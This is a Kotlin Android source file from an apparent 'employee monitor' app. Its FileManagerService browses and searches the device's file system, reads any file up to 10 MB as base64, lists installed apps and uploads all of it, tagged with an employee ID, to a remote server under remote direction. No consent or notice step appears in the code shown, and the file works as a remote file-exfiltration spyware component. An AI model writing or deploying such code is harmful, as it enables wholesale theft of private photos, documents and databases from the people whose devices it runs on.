package com.employeemonitor

import android.content.Context
import android.os.Environment
import android.os.StatFs
import android.util.Base64
import android.util.Log
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.io.IOException
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.concurrent.TimeUnit

object FileManagerService {

    private const val TAG = "FileManager"

    private val client = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(60, TimeUnit.SECONDS)
        .writeTimeout(120, TimeUnit.SECONDS)
        .retryOnConnectionFailure(true)
        .build()

    fun getStorageInfo(): JSONObject {
        val stat = StatFs(Environment.getDataDirectory().path)
        val totalBytes = stat.totalBytes
        val freeBytes = stat.availableBytes
        val usedBytes = totalBytes - freeBytes

        return JSONObject().apply {
            put("total_bytes", totalBytes)
            put("free_bytes", freeBytes)
            put("used_bytes", usedBytes)
            put("total_gb", String.format("%.1f", totalBytes / (1024.0 * 1024 * 1024)))
            put("free_gb", String.format("%.1f", freeBytes / (1024.0 * 1024 * 1024)))
            put("used_gb", String.format("%.1f", usedBytes / (1024.0 * 1024 * 1024)))
        }
    }

    fun browseDirectory(path: String): JSONObject {
        val dir = File(path)
        val result = JSONObject()

        try {
            if (!dir.exists()) {
                return result.apply { put("error", "Directory not found") }
            }
            if (!dir.isDirectory) {
                return result.apply { put("error", "Not a directory") }
            }

            val files = dir.listFiles() ?: emptyArray()
            val filesArray = JSONArray()
            val dateFormat = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US)

            for (file in files.sortedBy { !it.isDirectory }) {
                try {
                    val fileObj = JSONObject().apply {
                        put("name", file.name)
                        put("path", file.absolutePath)
                        put("is_directory", file.isDirectory)
                        put("is_hidden", file.isHidden)
                        put("last_modified", dateFormat.format(Date(file.lastModified())))
                        put("readable", file.canRead())
                        put("writable", file.canWrite())

                        if (file.isFile) {
                            put("size_bytes", file.length())
                            put("size_human", formatFileSize(file.length()))
                            put("extension", file.extension.lowercase())
                            put("mime_type", getMimeType(file.name))
                        } else {
                            val children = file.listFiles()?.size ?: 0
                            put("children_count", children)
                        }
                    }
                    filesArray.put(fileObj)
                } catch (_: Exception) {
                }
            }

            result.apply {
                put("path", dir.absolutePath)
                put("parent_path", dir.parent ?: "/")
                put("total_items", filesArray.length())
                put("files", filesArray)
                put("storage", getStorageInfo())
            }
        } catch (e: Exception) {
            Log.e(TAG, "browseDirectory failed: ${e.message}")
            result.put("error", e.message)
        }

        return result
    }

    fun readFileAsBase64(filePath: String, maxSizeBytes: Long = 10 * 1024 * 1024): String? {
        try {
            val file = File(filePath)
            if (!file.exists() || !file.isFile) return null
            if (file.length() > maxSizeBytes) return null

            val bytes = file.readBytes()
            return Base64.encodeToString(bytes, Base64.NO_WRAP)
        } catch (e: Exception) {
            Log.e(TAG, "readFileAsBase64 failed: ${e.message}")
            return null
        }
    }

    fun searchFiles(rootPath: String, query: String, maxResults: Int = 100): JSONObject {
        val result = JSONObject()
        val matches = JSONArray()
        val root = File(rootPath)

        try {
            if (!root.exists()) {
                return result.apply { put("error", "Root path not found") }
            }

            searchRecursive(root, query.lowercase(), matches, maxResults)

            result.apply {
                put("query", query)
                put("root_path", rootPath)
                put("total_matches", matches.length())
                put("results", matches)
            }
        } catch (e: Exception) {
            Log.e(TAG, "searchFiles failed: ${e.message}")
            result.put("error", e.message)
        }

        return result
    }

    private fun searchRecursive(dir: File, query: String, results: JSONArray, max: Int) {
        if (results.length() >= max) return
        try {
            val files = dir.listFiles() ?: return
            for (file in files) {
                if (results.length() >= max) return
                if (file.name.lowercase().contains(query)) {
                    val dateFormat = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US)
                    results.put(JSONObject().apply {
                        put("name", file.name)
                        put("path", file.absolutePath)
                        put("is_directory", file.isDirectory)
                        put("size_bytes", if (file.isFile) file.length() else 0)
                        put("size_human", formatFileSize(if (file.isFile) file.length() else 0))
                        put("last_modified", dateFormat.format(Date(file.lastModified())))
                    })
                }
                if (file.isDirectory && file.canRead() && !file.isHidden) {
                    searchRecursive(file, query, results, max)
                }
            }
        } catch (_: SecurityException) {
        }
    }

    fun sendDirectoryListing(serverUrl: String, empId: String, path: String) {
        val data = browseDirectory(path)
        data.put("employee_id", empId)
        data.put("timestamp", System.currentTimeMillis())

        val json = data.toString()
        val body = json.toRequestBody("application/json".toMediaType())
        val request = Request.Builder()
            .url("$serverUrl/api/filemanager/list")
            .post(body)
            .build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e(TAG, "Directory listing upload failed: ${e.message}")
            }
            override fun onResponse(call: Call, response: Response) {
                Log.d(TAG, "Directory listing uploaded: ${response.code}")
                response.close()
            }
        })
    }

    fun sendFileContent(serverUrl: String, empId: String, filePath: String) {
        val base64 = readFileAsBase64(filePath) ?: return
        val file = File(filePath)

        val json = JSONObject().apply {
            put("employee_id", empId)
            put("timestamp", System.currentTimeMillis())
            put("file_path", filePath)
            put("file_name", file.name)
            put("file_size", file.length())
            put("file_base64", base64)
            put("mime_type", getMimeType(file.name))
        }.toString()

        val body = json.toRequestBody("application/json".toMediaType())
        val request = Request.Builder()
            .url("$serverUrl/api/filemanager/file")
            .post(body)
            .build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e(TAG, "File upload failed: ${e.message}")
            }
            override fun onResponse(call: Call, response: Response) {
                Log.d(TAG, "File uploaded: ${response.code}")
                response.close()
            }
        })
    }

    fun sendSearchResults(serverUrl: String, empId: String, rootPath: String, query: String) {
        val data = searchFiles(rootPath, query)
        data.put("employee_id", empId)
        data.put("timestamp", System.currentTimeMillis())

        val json = data.toString()
        val body = json.toRequestBody("application/json".toMediaType())
        val request = Request.Builder()
            .url("$serverUrl/api/filemanager/search")
            .post(body)
            .build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e(TAG, "Search results upload failed: ${e.message}")
            }
            override fun onResponse(call: Call, response: Response) {
                Log.d(TAG, "Search results uploaded: ${response.code}")
                response.close()
            }
        })
    }

    fun getAllInstalledApps(context: Context): JSONObject {
        val result = JSONObject()
        val appsArray = JSONArray()

        try {
            val pm = context.packageManager
            val packages = pm.getInstalledPackages(0)

            for (i in 0 until packages.size) {
                val pkg = packages[i]
                val appInfo = pm.getApplicationInfo(pkg.packageName, 0)
                val label = pm.getApplicationLabel(appInfo).toString()
                val installDate = File(pkg.applicationInfo?.sourceDir ?: "").lastModified()
                val isSystemApp = (appInfo.flags.toInt() and android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0

                appsArray.put(JSONObject().apply {
                    put("package_name", pkg.packageName)
                    put("app_name", label)
                    put("version_name", pkg.versionName ?: "")
                    put("version_code", pkg.versionCode)
                    put("install_date", installDate)
                    put("is_system", isSystemApp)
                    put("source_dir", pkg.applicationInfo?.sourceDir ?: "")
                })
            }

            result.apply {
                put("total_apps", appsArray.length())
                put("apps", appsArray)
            }
        } catch (e: Exception) {
            Log.e(TAG, "getAllInstalledApps failed: ${e.message}")
            result.put("error", e.message)
        }

        return result
    }

    private fun formatFileSize(bytes: Long): String {
        return when {
            bytes < 1024 -> "$bytes B"
            bytes < 1024 * 1024 -> String.format("%.1f KB", bytes / 1024.0)
            bytes < 1024 * 1024 * 1024 -> String.format("%.1f MB", bytes / (1024.0 * 1024))
            else -> String.format("%.2f GB", bytes / (1024.0 * 1024 * 1024))
        }
    }

    private fun getMimeType(fileName: String): String {
        val ext = fileName.substringAfterLast('.').lowercase()
        return when (ext) {
            "jpg", "jpeg" -> "image/jpeg"
            "png" -> "image/png"
            "gif" -> "image/gif"
            "webp" -> "image/webp"
            "mp4" -> "video/mp4"
            "mkv" -> "video/x-matroska"
            "avi" -> "video/x-msvideo"
            "mov" -> "video/quicktime"
            "mp3" -> "audio/mpeg"
            "wav" -> "audio/wav"
            "ogg" -> "audio/ogg"
            "flac" -> "audio/flac"
            "pdf" -> "application/pdf"
            "doc", "docx" -> "application/msword"
            "xls", "xlsx" -> "application/vnd.ms-excel"
            "ppt", "pptx" -> "application/vnd.ms-powerpoint"
            "txt" -> "text/plain"
            "json" -> "application/json"
            "xml" -> "text/xml"
            "html" -> "text/html"
            "zip" -> "application/zip"
            "rar" -> "application/x-rar-compressed"
            "apk" -> "application/vnd.android.package-archive"
            "db", "sqlite" -> "application/x-sqlite3"
            "log" -> "text/plain"
            "csv" -> "text/csv"
            "apk" -> "application/vnd.android.package-archive"
            else -> "application/octet-stream"
        }
    }
}
